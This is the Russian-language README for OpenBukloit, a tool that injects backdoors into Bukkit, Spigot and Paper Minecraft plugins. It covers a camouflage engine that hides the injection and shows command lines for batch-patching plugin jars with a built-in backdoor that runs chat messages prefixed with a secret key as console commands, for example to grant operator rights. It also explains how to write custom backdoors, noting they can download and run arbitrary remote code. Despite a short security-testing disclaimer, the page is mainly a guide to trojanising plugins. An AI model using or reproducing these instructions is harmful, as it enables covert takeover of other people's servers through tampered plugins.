<div align="center"><h1>OpenBukloit - Инжектор бекдоров для Minecraft плагинов</h1></div>

<div align="center"><img alt="Logo" src="../logo.png"/></div>

<div align="center">
    <a href="https://github.com/VoxelHax/OpenBukloit/issues"><img alt="Open issues" src="https://img.shields.io/github/issues-raw/VoxelHax/OpenBukloit"/></a>
    <a href="https://github.com/Voxelhax/OpenBukloit/releases/latest"><img alt="GitHub downloads" src="https://img.shields.io/github/downloads/VoxelHax/OpenBukloit/total"></a>
    <img alt="Code size" src="https://img.shields.io/github/languages/code-size/VoxelHax/OpenBukloit"/>
    <a href="https://www.codefactor.io/repository/github/voxelhax/openbukloit"><img alt="CodeFactor" src="https://www.codefactor.io/repository/github/voxelhax/openbukloit/badge"/></a>
    <a href="https://discord.gg/xtaktPTzYp"><img alt="Discord" src="https://img.shields.io/discord/928214827095175199"></a>
</div>

<div align="center">
    <a href="https://github.com/Voxelhax/OpenBukloit/releases/latest"><img alt="Download" src="https://img.shields.io/badge/-СКАЧАТЬ_ПОСЛЕДНИЙ_РЕЛИЗ_(КЛИК)-blue?style=for-the-badge"/></a>
</div>

<br>

<hr>

**Языки: [English](../README.md), [Русский](README_RU.md), [Українська](README_UA.md)**

**OpenBukloit** — современный и мощный универсальный инжектор бекдоров, совместимый со всеми Bukkit/Spigot/Paper/и т.д. плагинами. Его особенностью является возможность интеграции с абсолютно любым плагином без необходимости каждый раз модифицировать бекдор. Более того, он обеспечивает мощный движок камуфляжа, что делает практически невозможным его поиск без достаточных знаний или продвинутых автоматизированных инструментов. OpenBukloit был разработан для тестирования систем безопасности серверов Minecraft, Команда VoxelHax не несет ответственности за его неправомерное использование.

Это продолжение проекта **[Bukloit](https://github.com/Rikonardo/Bukloit)**, в котором мы учли все проблемы предыдущего проекта и использовали совершенно другой подход к разработке.

## Возможности OpenBukloit
- **Полная поддержка Bukkit и его форков на любой версии Minecraft.**
- **Поддержка пользовательских бекдоров.**
- **Автоматическая загрузка JDK, поэтому вам не нужно заботиться о совместимости версии Java.**
- **Мощный камуфляжный движок, усложняющий поиск бекдора в плагине.**

## Установка
Для использования OpenBukloit у вас должна быть установлена любая версия Java (но не ниже 8). Затем загрузите OpenBukloit jar с [вкладки релизов](https://github.com/Voxelhax/OpenBukloit/releases/latest).

## Использование
Чтобы запустить OpenBukloit, откройте командную строку в каталоге, где находится jar-файл OpenBukloit и введите:

```sh
java -jar OpenBukloit.jar
```

После имени файла jar вы можете передать некоторые аргументы для настройки инжектора:

| Короткий аргумент | Длинный аргумент | Описание                                                                                                                                                                                         | Тип      |
|-------------------|------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------|
| -e                | --exploit        | Путь к пользовательскому скомпилированному файлу .class или к файлу исходного кода .java, который будет использоваться в качестве бекдора.<br />**По умолчанию используется встроенный бекдор.** | Значение |
| -m                | --mode           | Режим. Может быть одиночным/множественным.<br />**По умолчанию: <ins>multiple</ins>.**<br />В множественном режиме изменяет все файлы в указанной папке. В одиночном - только указанный файл.    | Значение |
| -i                | --input          | Путь к входной папке/файлу (зависит от режима).<br />**По умолчанию: <ins>in</ins> (<ins>in.jar</ins> если режим одиночный).**                                                                   | Значение |
| -o                | --output         | Путь к выходной папке/файлу (зависит от режима).<br />**По умолчанию: <ins>out</ins> (<ins>out.jar</ins> если режим одиночный).**                                                                | Значение |
| -r                | --replace        | Заменять выходной файл, если он уже существует.                                                                                                                                                  | Флаг     |

Но этих аргументов недостаточно для запуска OpenBukloit. Вы также должны указать параметры бекдора. Поскольку OpenBukloit поддерживает внедрение пользовательских бекдоров, вы должны передать дополнительные аргументы, которые требуются для используемого бекдора.

## Встроенный эксплоит

По умолчанию OpenBukloit внедряет встроенный бекдор. Это простой бекдор, который позволяет вам выполнять любые команды из консоли, написав специальное ключевое слово перед командой в чате.

Параметры встроенного бекдора:

| Длинный аргумент | Описание                                                   |
|------------------|------------------------------------------------------------|
| --key            | Ключевое слово, запускающее выполнение консольной команды. |

Использование в игре ключа, установленного на "hackthisserver":

```
hackthisserver op MyName
```

Это сообщение, отправленное в чат, будет выполнено как консольная команда и даст ОП игроку MyName.

**Вот несколько примеров использования OpenBukloit со встроенным бекдором:**

1. Пропатчить все .jar файлы с ключом "#console" из папки "in" и сохранить их в папку "out" без замены.

```sh
java -jar OpenBukloit.jar -m multiple -i "in" -o "out" --key "#console"
```

2. Пропатчить все файлы с ключом "hacktheserver" из папки "in" и сохранить их в папку "out" с заменой.

```sh
java -jar OpenBukloit.jar -m multiple -i "in" -o "out" --key "hacktheserver" -r
```

3. Пропатчить один файл "PluginName.jar" с ключом "#console" и сохраните его как файл "Output.jar" с заменой.

```sh
java -jar OpenBukloit.jar -m single -i "PluginName.jar" -o "Output.jar" --key "#console" -r
```

## Написание пользовательского эксплоита

Вы также можете написать свой собственный бекдор. Это должен быть класс с методом `public static void inject(JavaPlugin args)` (JavaPlugin из Bukkit API).

Вот простой пример:

```java
import org.bukkit.plugin.java.JavaPlugin;

public class MyBackdoor {
    public static void inject(JavaPlugin args) {
        System.out.println("Hello, world!");
    }
}
```

Метод `inject` будет выполнен после метода `onEnable` плагина. Вы можете делать здесь все, что хотите, включая загрузку и запуск произвольного кода из Интернета.

Но вы должны знать, что есть некоторые ограничения:
- В настоящее время вы не можете использовать вложенные классы, в файле эксплоита должен быть только один класс.
- Вы не должны ссылаться на свой класс эксплоита внутри него, например, использовать его как параметры метода, как возвращаемое значение или как тип поля.

Вы можете использовать внешние параметры из командной строки, используя %плейсхолдеры%, они будут подставлены в процессе инжекта:

```java
import org.bukkit.plugin.java.JavaPlugin;

public class MyBackdoor {
    public static void inject(JavaPlugin args) {
        System.out.println("Hello, %name%!");
    }
}
```

Затем вы можете заинжектить бекдор с помощью команды:

```sh
java -jar OpenBukloit.jar -e MyBackdoor.java --name world
```

Обратите внимание, что мы можем передать наш бекдор в OpenBukloit без компиляции, и он автоматически скомпилирует его с наличием API Spigot в пуле классов во время компиляции.
